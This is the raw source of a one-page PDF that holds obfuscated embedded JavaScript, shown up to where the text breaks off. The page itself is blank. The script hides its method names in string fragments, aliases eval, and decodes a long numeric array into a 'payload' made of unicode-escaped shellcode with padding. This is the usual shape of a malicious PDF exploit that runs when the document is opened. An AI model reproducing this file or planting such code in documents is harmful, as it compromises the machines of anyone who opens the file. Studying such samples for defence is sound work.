%PDF-1.3
3 0 obj
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 26136>>
stream
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 300.00 400.00]
>>
endobj
5 0 obj
<</Type /Font
/BaseFont /Helvetica
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
>>
/XObject <<
>>
>>
endobj
6 0 obj
<<
/Names [(HtYfjPssa) 7 0 R ]
>>
endobj
7 0 obj
<<
/S /JavaScript
/JS (
var lgYWlIS3H="rCo";var VDIbMAufR6T="d";
var UyUIx = "cha"+lgYWlIS3H+VDIbMAufR6T+"eA";
var d8iLadtQl = eval;
var IFOT0116 = 223;
var pEzIZxqq3pSe = 32;
var IZuz = 65; 
var uLNSITVMm="re";var GDcXmkoV="r";var rNNTXD5a="in";var wSe89Wg="f";var znJ3fFNj="har";var U9l7h0owdjSJ="de";
var a3cxhuOubG=uLNSITVMm+"t"+"ur"+"n"+" St"+GDcXmkoV+rNNTXD5a+"g."+wSe89Wg+"ro"+"mC"+znJ3fFNj+"Co"+U9l7h0owdjSJ+"((((c = c.UyUIx(0)) & IFOT0116) - 52) %26 + (c & pEzIZxqq3pSe) + IZuz);";
var s = "22 130 109 126 44 124 109 133 120 123 109 112 44 73 44 129 122 113 127 111 109 124 113 52 46 49 129 60 77 60 77 49 129 60 77 60 77 49 129 60 77 60 77 46 55 46 49 129 81 61 80 69 49 129 63 64 80 69 49 129 65 68 62 64 49 129 65 68 65 68 49 129 63 63 65 68 49 129 78 63 80 78 49 129 60 63 61 79 49 129 63 61 79 63 49 129 66 66 79 69 49 129 81 69 68 61 49 129 82 77 66 65 49 129 63 60 68 60 49 129 64 60 62 61 49 129 82 77 81 62 49 129 61 67 79 69 49 129 62 61 62 62 49 129 64 69 62 61 49 129 60 61 62 61 49 129 62 61 62 61 49 129 62 61 64 78 49 129 82 61 80 81 49 129 62 61 69 68 49 129 62 61 63 61 49 129 77 77 62 61 49 129 79 77 80 69 49 129 67 82 62 64 49 129 68 65 80 62 49 129 82 61 80 81 49 129 80 67 79 69 49 129 80 81 80 81 49 129 79 69 80 81 49 129 62 62 61 79 49 129 62 61 62 61 49 129 80 69 77 77 49 129 61 69 79 69 49 129 62 61 62 61 49 129 79 69 62 61 49 129 62 60 66 79 49 129 62 61 62 61 49 129 66 67 79 69 49 129 62 61 62 61 49 129 79 69 62 61 49 129 62 62 82 77 49 129 62 61 62 61 49 129 80 69 77 77 49 129 60 63 79 69 49 129 62 61 62 61 49 129 79 69 62 61 49 129 62 60 66 65 49 129 62 61 62 61 49 129 61 61 79 69 49 129 62 61 62 61 49 129 79 69 62 61 49 129 62 62 77 68 49 129 62 61 62 61 49 129 80 69 77 77 49 129 62 80 79 69 49 129 62 61 62 61 49 129 79 69 62 61 49 129 62 60 64 60 49 129 62 61 62 61 49 129 63 78 79 69 49 129 62 61 62 61 49 129 79 77 62 61 49 129 67 62 67 69 49 129 82 80 77 77 49 129 64 78 67 62 49 129 64 69 66 61 49 129 63 61 62 61 49 129 62 61 62 61 49 129 79 69 67 66 49 129 62 63 69 60 49 129 62 61 62 61 49 129 79 64 79 69 49 129 62 61 62 61 49 129 67 69 62 61 49 129 67 62 81 62 49 129 82 80 77 77 49 129 64 78 67 62 49 129 64 69 60 61 49 129 63 61 62 61 49 129 62 61 62 61 49 129 79 69 67 66 49 129 62 63 78 68 49 129 62 61 62 61 49 129 81 79 79 69 49 129 62 61 62 61 49 129 67 69 62 61 49 129 67 66 81 62 49 129 61 80 79 69 49 129 62 61 62 65 49 129 77 77 62 61 49 129 61 62 80 69 49 129 66 68 81 68 49 129 81 61 61 62 49 129 81 62 69 61 49 129 80 63 80 80 49 129 77 79 68 82 49 129 80 81 66 66 49 129 81 62 67 81 49 129 61 82 67 77 49 129 62 66 81 67 49 129 61 82 69 69 49 129 67 81 77 68 49 129 64 67 62 60 49 129 81 66 61 82 49 129 62 64 66 66 49 129 79 61 80 81 49 129 79 68 81 62 49 129 62 65 78 64 49 129 62 61 62 61 49 129 77 60 67 77 49 129 63 65 79 80 49 129 62 61 62 60 49 129 77 77 62 61 49 129 61 82 82 65 49 129 62 63 81 66 49 129 64 79 64 62 49 129 60 61 64 65 49 129 81 66 61 82 49 129 62 65 66 63 49 129 64 62 60 81 49 129 60 63 60 61 49 129 81 63 77 62 49 129 61 62 62 69 49 129 67 61 81 61 49 129 64 69 67 61 49 129 62 60 62 65 49 129 62 61 62 61 49 129 67 62 67 63 49 129 79 69 67 61 49 129 62 62 81 60 49 129 62 61 62 61 49 129 82 61 80 81 49 129 80 80 77 77 49 129 81 66 77 77 49 129 81 61 77 62 49 129 61 82 62 69 49 129 63 69 77 78 49 129 82 77 77 65 49 129 62 62 65 65 49 129 79 77 66 61 49 129 61 82 80 67 49 129 62 61 81 67 49 129 61 62 60 63 49 129 61 82 82 63 49 129 67 61 77 69 49 129 77 62 62 60 49 129 67 65 79 80 49 129 81 61 61 62 49 129 82 77 61 62 49 129 81 80 77 77 49 129 80 69 77 62 49 129 65 79 67 65 49 129 61 82 62 68 49 129 63 80 77 68 49 129 77 62 62 60 49 129 62 65 81 61 49 129 80 63 79 77 49 129 81 80 77 77 49 129 82 68 77 77 49 129 81 62 77 62 49 129 61 62 63 61 49 129 61 82 81 61 49 129 66 62 81 66 49 129 62 60 60 80 49 129 62 61 62 61 49 129 67 60 62 61 49 129 67 61 67 62 49 129 67 61 67 61 49 129 67 61 67 61 49 129 67 66 67 61 49 129 79 69 67 61 49 129 62 62 61 68 49 129 62 61 62 61 49 129 63 68 79 69 49 129 62 61 62 61 49 129 64 65 62 61 49 129 62 65 68 60 49 129 62 61 62 61 49 129 77 79 62 61 49 129 64 61 68 61 49 129 80 81 80 81 49 129 79 69 80 81 49 129 62 62 61 66 49 129 62 61 62 61 49 129 82 77 61 62 49 129 67 62 67 62 49 129 67 62 67 62 49 129 82 61 80 81 49 129 61 69 77 61 49 129 77 61 79 69 49 129 79 68 61 69 49 129 62 81 65 64 49 129 65 69 77 60 49 129 78 61 62 64 49 129 78 61 78 61 49 129 65 65 78 61 49 129 67 64 62 67 49 129 79 80 77 77 49 129 66 61 77 79 49 129 80 81 62 64 49 129 79 69 79 61 49 129 80 81 60 82 49 129 80 81 80 81 49 129 79 69 81 62 49 129 80 81 60 69 49 129 80 81 80 81 49 129 63 60 69 69 49 129 62 65 62 60 49 129 81 63 77 61 49 129 62 61 62 80 49 129 63 77 79 69 49 129 80 81 80 81 49 129 61 62 80 81 49 129 67 61 81 61 49 129 79 69 67 65 49 129 62 61 67 65 49 129 62 61 62 61 49 129 79 69 67 61 49 129 62 63 77 77 49 129 62 61 62 61 49 129 82 61 80 81 49 129 77 61 61 67 49 129 60 65 61 80 49 129 65 66 62 61 49 129 79 69 62 78 49 129 62 63 66 60 49 129 62 61 62 61 49 129 80 81 61 62 49 129 80 81 67 66 49 129 79 69 82 61 49 129 62 60 80 77 49 129 62 61 62 61 49 129 80 81 64 69 49 129 62 61 62 61 49 129 80 81 62 61 49 129 79 69 82 61 49 129 80 82 79 69 49 129 80 81 80 81 49 129 67 66 67 62 49 129 61 62 67 67 49 129 67 61 81 61 49 129 79 69 67 65 49 129 62 61 63 82 49 129 62 61 62 61 49 129 79 69 67 61 49 129 62 63 67 64 49 129 62 61 62 61 49 129 82 61 80 81 49 129 77 61 61 67 49 129 60 65 61 80 49 129 65 66 62 61 49 129 79 69 62 78 49 129 62 63 62 77 49 129 62 61 62 61 49 129 80 81 61 62 49 129 80 81 67 66 49 129 67 69 82 61 49 129 67 81 67 82 49 129 81 62 67 77 49 129 62 63 79 77 49 129 81 62 67 69 49 129 80 68 79 69 49 129 80 81 80 81 49 129 67 67 80 81 49 129 77 62 67 66 49 129 62 69 79 80 49 129 80 80 77 77 49 129 62 69 64 78 49 129 61 82 67 66 49 129 65 66 80 81 49 129 79 69 63 65 49 129 62 63 67 79 49 129 62 61 62 61 49 129 82 61 80 81 49 129 80 80 77 77 49 129 64 60 64 69 49 129 64 64 64 79 49 129 64 69 62 61 49 129 66 64 66 68 49 129 65 63 66 67 49 129 80 65 77 77 49 129 62 69 69 68 49 129 62 61 62 61 49 129 80 62 62 61 49 129 65 64 68 67 49 129 64 78 60 81 49 129 61 82 62 61 49 129 65 65 80 81 49 129 60 61 60 65 49 129 60 65 79 69 49 129 62 61 62 63 49 129 80 81 62 61 49 129 77 77 82 61 49 129 79 69 80 69 49 129 62 60 81 77 49 129 62 61 62 61 49 129 82 61 80 81 49 129 80 69 61 77 49 129 62 69 65 65 49 129 77 77 61 67 49 129 60 65 66 65 49 129 61 82 60 61 49 129 62 61 80 81 49 129 80 81 61 82 49 129 60 65 65 65 49 129 79 69 63 80 49 129 62 60 79 81 49 129 62 61 62 61 49 129 82 61 80 81 49 129 81 65 77 62 49 129 67 81 63 61 49 129 69 69 67 82 49 129 62 61 62 60 49 129 62 61 62 61 49 129 64 69 81 62 49 129 64 82 64 81 49 129 62 61 62 61 49 129 65 64 64 69 49 129 64 80 65 63 49 129 79 77 64 79 49 129 77 79 63 64 49 129 60 65 66 65 49 129 67 61 62 65 49 129 60 63 79 69 49 129 80 81 80 82 49 129 67 61 80 81 49 129 66 78 79 69 49 129 62 61 62 63 49 129 79 68 62 61 49 129 80 82 79 63 49 129 80 81 80 81 49 129 79 67 79 69 49 129 80 81 80 81 49 129 77 62 80 81 49 129 62 69 81 65 49 129 64 78 81 62 49 129 64 69 64 80 49 129 65 65 64 82 49 129 64 80 64 65 49 129 63 64 79 77 49 129 66 65 77 79 49 129 62 65 60 65 49 129 79 69 67 61 49 129 80 79 80 77 49 129 80 81 80 81 49 129 79 69 67 61 49 129 62 63 60 62 49 129 62 61 62 61 49 129 69 77 79 68 49 129 80 81 80 82 49 129 79 69 80 81 49 129 80 81 79 67 49 129 80 81 80 81 49 129 81 65 77 62 49 129 81 62 62 69 49 129 61 62 64 69 49 129 62 61 61 63 49 129 64 69 62 61 49 129 65 62 65 64 49 129 65 63 64 64 49 129 63 64 79 77 49 129 66 65 77 79 49 129 62 65 60 65 49 129 79 69 67 61 49 129 80 79 82 60 49 129 80 81 80 81 49 129 79 69 67 61 49 129 62 60 80 68 49 129 62 61 62 61 49 129 78 60 79 68 49 129 80 81 80 82 49 129 79 69 80 81 49 129 80 81 79 67 49 129 80 81 80 81 49 129 81 65 77 62 49 129 81 62 62 69 49 129 64 62 64 69 49 129 65 66 65 67 49 129 64 69 62 61 49 129 64 69 65 62 49 129 64 81 64 65 49 129 63 64 79 77 49 129 66 65 77 79 49 129 62 65 60 65 49 129 79 69 67 61 49 129 80 79 68 66 49 129 80 81 80 81 49 129 79 69 67 61 49 129 62 60 81 81 49 129 62 61 62 61 49 129 64 66 79 68 49 129 80 81 80 82 49 129 79 69 80 81 49 129 80 81 79 67 49 129 80 81 80 81 49 129 81 65 77 62 49 129 81 62 62 69 49 129 65 67 64 69 49 129 65 69 64 66 49 129 79 77 62 61 49 129 77 79 63 64 49 129 60 65 66 65 49 129 67 61 62 65 49 129 77 63 79 69 49 129 80 81 80 79 49 129 67 61 80 81 49 129 68 78 79 69 49 129 62 61 62 60 49 129 79 68 62 61 49 129 80 82 66 63 49 129 80 81 80 81 49 129 79 67 79 69 49 129 80 81 80 81 49 129 77 62 80 81 49 129 62 65 81 65 49 129 79 69 81 62 49 129 62 60 68 77 49 129 62 61 62 61 49 129 63 77 64 69 49 129 66 67 81 67 49 129 67 61 65 68 49 129 81 67 79 69 49 129 62 61 62 60 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 62 60 78 66 49 129 62 61 62 61 49 129 79 80 64 69 49 129 62 62 78 66 49 129 67 61 62 80 49 129 69 63 79 69 49 129 62 61 62 60 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 62 60 77 62 49 129 62 61 62 61 49 129 68 78 64 69 49 129 62 79 80 80 49 129 67 61 65 80 49 129 78 82 79 69 49 129 62 61 62 60 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 62 60 64 81 49 129 62 61 62 61 49 129 79 79 64 69 49 129 79 81 67 67 49 129 67 61 61 67 49 129 77 78 79 69 49 129 62 61 62 60 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 62 60 67 77 49 129 62 61 62 61 49 129 80 61 64 69 49 129 62 65 77 78 49 129 67 61 67 81 49 129 65 67 79 69 49 129 62 61 62 60 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 80 82 80 66 49 129 80 81 80 81 49 129 65 69 64 69 49 129 82 77 64 69 49 129 67 61 63 80 49 129 64 63 79 69 49 129 62 61 62 60 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 62 60 61 62 49 129 62 61 62 61 49 129 79 81 64 69 49 129 79 61 81 82 49 129 67 61 64 61 49 129 66 82 79 69 49 129 62 61 62 60 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 62 60 63 81 49 129 62 61 62 61 49 129 69 61 64 69 49 129 60 79 66 68 49 129 67 61 82 77 49 129 61 78 79 69 49 129 62 61 62 60 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 80 81 61 67 49 129 80 81 80 81 49 129 68 77 64 69 49 129 78 77 67 82 49 129 67 61 63 82 49 129 60 67 79 69 49 129 62 61 62 60 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 80 82 68 66 49 129 80 81 80 81 49 129 67 68 64 69 49 129 77 60 78 66 49 129 67 61 62 63 49 129 63 63 79 69 49 129 62 61 62 60 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 62 61 79 62 49 129 62 61 62 61 49 129 65 82 64 69 49 129 79 63 82 69 49 129 67 61 65 62 49 129 80 82 79 69 49 129 62 61 62 61 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 62 61 81 81 49 129 62 61 62 61 49 129 78 82 64 69 49 129 69 77 80 68 49 129 67 61 61 64 49 129 79 78 79 69 49 129 62 61 62 61 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 80 82 78 63 49 129 80 81 80 81 49 129 67 66 64 69 49 129 69 64 68 61 49 129 67 61 69 77 49 129 82 67 79 69 49 129 62 61 62 61 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 80 82 65 82 49 129 80 81 80 81 49 129 63 78 64 69 49 129 63 82 65 78 49 129 67 61 62 63 49 129 81 63 79 69 49 129 62 61 62 61 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 80 82 64 78 49 129 80 81 80 81 49 129 79 61 64 69 49 129 61 61 67 77 49 129 67 61 78 65 49 129 68 82 79 69 49 129 62 61 62 61 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 80 82 67 67 49 129 80 81 80 81 49 129 78 66 64 69 49 129 79 63 81 68 49 129 67 61 68 62 49 129 78 78 79 69 49 129 62 61 62 61 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 80 82 66 63 49 129 80 81 80 81 49 129 64 69 64 69 49 129 81 64 60 65 49 129 67 61 69 62 49 129 77 67 79 69 49 129 62 61 62 61 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 62 61 67 66 49 129 62 61 62 61 49 129 65 63 64 69 49 129 69 62 80 82 49 129 67 61 63 67 49 129 65 63 79 69 49 129 62 61 62 61 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 80 82 66 65 49 129 80 81 80 81 49 129 63 62 79 77 49 129 64 64 64 78 49 129 79 69 67 61 49 129 80 77 80 66 49 129 80 81 80 81 49 129 79 69 67 61 49 129 80 82 68 77 49 129 80 81 80 81 49 129 69 66 79 68 49 129 80 81 80 80 49 129 79 69 80 81 49 129 80 81 79 69 49 129 80 81 80 81 49 129 79 69 81 62 49 129 80 79 68 68 49 129 80 81 80 81 49 129 66 81 64 69 49 129 66 81 79 81 49 129 67 61 62 64 49 129 61 82 79 69 49 129 62 61 62 61 49 129 77 62 62 61 49 129 62 69 81 65 49 129 79 69 81 62 49 129 62 61 62 81 49 129 62 61 62 61 49 129 77 82 64 69 49 129 62 82 66 82 49 129 67 61 79 80 49 129 60 78 79 69 49 129 62 61 62 61 49 129 77 62 62 61 49 129 62 69 81 65 49 129 61 62 81 62 49 129 64 65 81 61 49 129 66 61 77 77 49 129 77 64 61 61 49 129 65 69 81 61 49 129 61 82 63 61 49 129 66 61 77 77 49 129 61 82 62 80 49 129 65 61 77 77 49 129 68 79 63 80 49 129 77 77 61 82 49 129 62 69 66 61 4